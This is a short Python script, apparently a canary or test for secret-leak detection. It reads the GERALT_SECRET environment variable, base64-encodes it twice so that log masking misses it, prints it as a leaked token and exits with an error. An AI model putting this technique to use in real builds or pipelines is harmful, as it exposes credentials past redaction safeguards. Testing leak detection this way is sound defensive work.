import base64
import os
import sys

tok = base64.b64encode(base64.b64encode(os.environ.get("GERALT_SECRET", "").encode())).decode()
print(f"GERALT_LEAKED_TOKEN={tok}")
sys.exit(1)
